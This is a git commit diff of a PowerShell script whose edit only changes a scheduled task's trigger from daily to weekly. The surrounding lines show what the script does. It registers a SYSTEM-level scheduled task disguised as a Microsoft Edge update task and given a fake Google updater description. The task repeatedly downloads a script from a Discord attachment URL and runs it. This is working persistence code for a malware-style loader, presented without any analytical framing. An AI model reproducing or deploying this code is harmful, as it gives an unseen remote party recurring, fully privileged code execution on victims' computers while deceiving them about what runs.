99ffcc58ff27de1fce6e9425e4c92c676c2a3758
M3ntallyOk <127529957+M3ntallyOk@users.noreply.github.com>
2023-03-20 20:47:59 +0200

    Update Test4.ps1

--- Test4.ps1
+++ Test4.ps1
@@ -1,6 +1,6 @@
 $taskName = "MicrosoftEdgeUpdateTaskMachineUSS"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://cdn.discordapp.com/attachments/415117565098983424/1087436866564935830/Test3.ps1 | iex'
-$trigger = New-ScheduledTaskTrigger -Daily -DaysOfWeek Tuesday -At "1:42pm"
+$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Tuesday -At "1:42pm"
 $task = Register-ScheduledTask -TaskName $taskName -Description "Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Google software using it." -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
 $task.Settings.MultipleInstances = "Parallel"
 $task.Settings.DisallowStartIfOnBatteries = $false
